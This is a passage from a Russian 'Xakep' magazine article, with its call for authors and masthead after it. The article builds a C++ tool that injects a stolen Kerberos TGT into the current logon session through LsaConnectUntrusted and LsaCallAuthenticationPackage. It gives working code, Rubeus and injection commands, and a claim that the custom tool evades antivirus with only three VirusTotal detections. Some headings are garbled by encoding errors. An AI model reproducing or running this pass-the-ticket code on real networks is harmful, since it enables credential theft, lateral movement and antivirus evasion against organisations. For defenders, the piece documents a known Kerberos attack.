   Вто рая функция достаточно незамысловата — прос то подклю чение к LSA
от лица «недове ренного» процесса. Само собой, в этом случае нельзя будет
использовать LSA для аутентификации, но воз можность простого взаимодей-
ствия с под груженными пакета ми аутентифика ции останется. Для нас пред-
почти тельнее имен но этот вари ант.


HANDLE lsa_handle = NULL;
NTSTATUS status = LsaConnectUntrusted(&lsa_handle);
if (!NT_SUCCESS(status) || !lsa_handle) {
    std::wcout << L"[-] Error connecting to lsa: " <<
LsaNtStatusToWinError(status) << std::endl;
    return 1;
}

Здесь мы получа ем хендл на LSA, а затем проверя ем с помощью ранее соз-
данно го макроса NT_SUCCESS() (лежит в stuff.h), что фун кция успешно сра-
бота ла.


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

Ес ли что-то пош ло не так, дергаем LsaNtStatusToWinError(). Эта функция
позволя ет конверти ровать непонятный код, с которым завершилась функция,
в челове ческий код ошиб ки. Что бы узнать, в чем дело, скопируй полученное
зна чение и срав ни его с ошиб ками в докумен тации Microsoft.


ÎÁÍÀÐÓÆÅÍÈÅ AP

У  LSA  каждый  Authentication  Package  идентифицируется  спе циальным
номером, эдаким «айдишником», благодаря которому система понимает,
с чем тре буется взаимодей ство вать для реализации функций безопас ности.
Это числовое значение абсолют но рандомно, оно присваивается самой LSA,
где и хранится до перезагрузки системы. Для получения этого номера
используется функция LsaLookupAuthenticationPackage().


NTSTATUS LsaLookupAuthenticationPackage(
  [in]  HANDLE      LsaHandle,
  [in]  PLSA_STRING PackageName,
  [out] PULONG      AuthenticationPackage
);

Первым параметром мы переда ем хендл LSA, полученный вызовом LsaCon-
nectUntrusted(),  а  дальше  начина ются  проблемы.  Функция  про сит
передать ей структуру LSA_STRING, которая выг лядит вот так:


typedef struct _LSA_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PCHAR  Buffer;
} LSA_STRING, *PLSA_STRING;

У меня далеко не с пер вого раза получи лось кор ректно инициализировать ее.
Поэтому, что бы не мучить ся в будущем, реализовал небольшую функцию,
при нимающую имя пакета аутентифика ции и возвращающую запол ненную
структуру:


LSA_STRING* create_lsa_string(const char* value)
{
    char* buf = new char[100];
    LSA_STRING* str = (LSA_STRING*)buf;
    str->Length = strlen(value);
    str->MaximumLength = str->Length;
    str->Buffer = buf + sizeof(LSA_STRING);
    memcpy(str->Buffer, value, str->Length);
    return str;
}



// Вызов
PLSA_STRING lsaString = create_lsa_string("kerberos");


    ULONG authenticationpackage = 0;
    status = LsaLookupAuthenticationPackage(lsa_handle, lsaString, &
authenticationpackage);
    if (authenticationpackage == 0) {
        std::wcout << L"[-] Error LsaLookupAP: " <<
LsaNtStatusToWinError(status) << std::endl;
        return 1;
    }
    std::wcout << L"[?] Package id " << authenticationpackage << std:
:endl;

Ес ли вызов был успе шен, то LSA вернет нам этот самый «айдишник» AP Ker-
beros, с помощью которого мы сможем взаимодействовать через LSA с Ker-
beros.dll.


ÂÍÅÄÐÅÍÈÅ ÁÈËÅÒÀ

Осталось лишь отдать билет Kerberos в соот ветс твующий AP для его ини-
циализации. Для взаимо действия с конкретным AP LSA предос тавляет фун-
кцию  LsaCallAuthenticationPackage(), которую мы и будем использовать
для внедрения билета:


NTSTATUS LsaCallAuthenticationPackage(
  [in]  HANDLE    LsaHandle,
  [in]  ULONG     AuthenticationPackage,
  [in]  PVOID     ProtocolSubmitBuffer,
  [in]  ULONG     SubmitBufferLength,
  [out] PVOID     *ProtocolReturnBuffer,
  [out] PULONG    ReturnBufferLength,
  [out] PNTSTATUS ProtocolStatus
);

Первым параметром указывается тот же хендл на LSA, что и в пре дыдущих
функциях, вто рым — «айдишник» пакета аутен тификации. Далее в Protocol-
SubmitBuffer  и  SubmitBufferLength  следует  передать  информацию,
которую мы хотим сооб щить пакету аутен тифика ции (в нашем слу чае это TGT-
билет). В ProtocolReturnBuffer, ReturnBufferLength сам AP может
поместить данные, которые хочет вернуть программе. Наконец, последним
парамет ром возвращается идентифика тор ошиб ки.
  Просто взять и засунуть билет в вызов этой функции не получится.
На текущем эта пе наш билет находится в переменной kirbiTicket. Сначала
следует сге нери ровать струк туру KERB_SUBMIT_TKT_REQUEST:


typedef struct _KERB_SUBMIT_TKT_REQUEST {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
    ULONG Flags;
    KERB_CRYPTO_KEY32 Key;
    ULONG KerbCredSize;
    ULONG KerbCredOffset;
} KERB_SUBMIT_TKT_REQUEST, *PKERB_SUBMIT_TKT_REQUEST

Здесь исполь зуют ся следующие параметры:
 • MessageType — опре деляет типы сообщений, которые мы можем передать
   в AP Kerberos. Для инжекта тикета мы будем передавать KerbSubmit
  TicketMessage. Это означает процеду ру получе ния тикета от KDC
   и обновле ние кеша билетов;
 • LogonId — уникаль ный идентифика тор текущей сес сии, поз воляющий AP
   идентифицировать, к какой сессии применять тикет (если не указано, то
  AP Kerberos опре делит LUID самостоятельно);
 • Flags — дополнительные флаги;
 • Key —  струк тура,  содержащая информа цию  о  сессионном  ключе
   для тикета Kerberos;
 • KerbCredSize, KerbCredOffset — в слу чае инжекта тикета в первый
   параметр передаем размер тикета, а во второй — сдвиг. Сдвиг определя-
   ет размер этой структуры. Так как мы будем передавать в AP тикет и эту
   струк туру, то AP должен знать, начиная с какого сме щения лежит тикет.

Кор рек тная передача билета в AP Kerberos выглядит вот так:


    NTSTATUS packageStatus;
    DWORD submitSize, responseSize;
    PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
    PVOID dumPtr;


    submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
    if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR,
submitSize))
    {
        pKerbSubmit->MessageType = KerbSubmitTicketMessage;
        pKerbSubmit->KerbCredSize = kirbiSize;
        pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST)
;
        RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->
KerbCredOffset, kirbiTicket, pKerbSubmit->KerbCredSize);
        status = LsaCallAuthenticationPackage(lsa_handle,
authenticationpackage, pKerbSubmit, submitSize, &dumPtr, &
responseSize, &packageStatus);
        if (NT_SUCCESS(status))
        {
            if (NT_SUCCESS(packageStatus))
            {
                std::wcout << L"[+] Injected\n" << std::endl;
                status = 0x0;
            }
            else if (LsaNtStatusToWinError(packageStatus) == 1398) {
                std::wcout << L"[!!!!] ERROR_TIME_SKEW between KDC
and host computer" << std::endl;
            }
            else std::wcout << L"[-] KerbSubmitTicketMessage /
Package :" << LsaNtStatusToWinError(packageStatus) << "\n";
        }
        else std::wcout << L"[-] KerbSubmitTicketMessage :" <<
LsaNtStatusToWinError(status) << "\n";
    }
    LsaDeregisterLogonProcess(lsa_handle);


    return 0;
}

Сна чала мы рас счи тываем раз мер всех дан ных, которые будут переданы в AP.
Этот размер равен размеру структуры KERB_SUBMIT_TGT_REQUEST (чтобы AP
понял, что нам от него надо) плюс раз мер тикета. Далее под эту структуру
выделяется память, после чего инициализируются ее элементы.
  В pKerbSubmit->KerbCredOffset мы помещаем раз мер структуры, что бы
«Керберос» знал, что по адресу pKerbSubmit + pKerbSubmit->KerbCredOff-
set будет лежать тикет размером pKerbSubmit->KerbCredSize (KirbiSize).
Копируем по рассчи танному адресу тикет, после чего вызываем AP с переда-
чей ини циали зиро ванной структуры. Затем проверя ем код ошибки дважды.
Первый код ошиб ки (status) — возможная проб лема при вызове самой фун-
кции,   нап ример   если   lsa_handle   невалидный.  А   второй   код
(packageStatus) — код ошиб ки непосредс твенно самого AP, например если
мы передадим неп равиль ный раз мер.
  Причем я вынес в отдельный блок провер ку на ошиб ку ERROR_TIME_SKEW,
которая появляет ся из-за рас хождения (более пяти минут) во времени меж ду
хостом и KDC. Если подобная раз ница при сутс твует, то TGT-билет не может
быть обновлен из-за того, что невозможно корректно прой ти этап предаутен-
тификации. Да, тикет получится использовать, но лишь до тех пор, пока он
не про тухнет. По умолчанию вре мя жизни TGT-билета — десять часов.
  После этого тикет будет успешно внед рен в процесс lsass.exe и мы смо-
жем его исполь зовать. Фун кци ей LsaDeregisterLogonProcess() мы просто
освобождаем хендл на LSA.


ÏÐÎÂÅÐÊÀ

Остает ся лишь про верить работоспособ ность кода. Пол ный код проекта
представ лен на GitHub. Сначала мы получим валидный TGT-билет любым
удобным способом. Нап ример, с помощью Rubeus:


.\Rubeus.exe tgtdeleg /nowrap





                      Получение тикета

Пе реместимся на другую систему и про ведем инжект:


.\project.exe <b64 ticket>





ÂÛÂÎÄÛ

Множество атак можно реали зовать без использования популярных и обще-
известных инструмен тов. У такого подхода есть как минимум одно преиму-
щество: из-за уникальнос ти кода, использования легитим ных API и отсутствия
в сиг натур ных базах появляется возможность обойти антивирусное ПО в два
сче та. Я загрузил свой проект на VirusTotal, не сделав абсолютно никакой
обфускации и защиты. Вот как есть, так и закинул, со всеми подоз рительными
строками, нап ример [+] Injected, и получил все го три детекта.





Как ты понима ешь, если мы заль ем туда Mimikatz, Rubeus или другой подоб-
ный инс трумент, который умеет выполнять внедрение билетов, то детектов
будет на порядок больше. © X
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №4 (289)

          Андрей Пись менный    Ва лентин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редак тор             Разработ ка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                 Евгения Шарипова
                                     Литера тур ный редактор


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глаз ков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА
                                  Анна Яков лева
                                  Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Вопросы о матери алах:
                                 lapina@glc.ru               support@glc.ru





Адрес редак ции: 125080, город Москва, Волоколамское шос се, дом 1, строение 1, этаж 8, помеще ние IX, комната 54, офис 7. Изда тель: ИП
Югай Алек сандр Олегович, 400046, Волгоградская область, г. Вол гоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфе ре связи, информацион ных технологий и мас совых коммуникаций (Роскомнадзоре), свидетельство Эл № ФС77-67001 от 30.
08.2016 года. Мнение редак ции не обязательно совпада ет с мнением авторов. Все материалы в номере предоставляются как информа ция
к размышле нию. Лица, исполь зующие данную информацию в противозакон ных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содер жание рекламных объявле ний в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022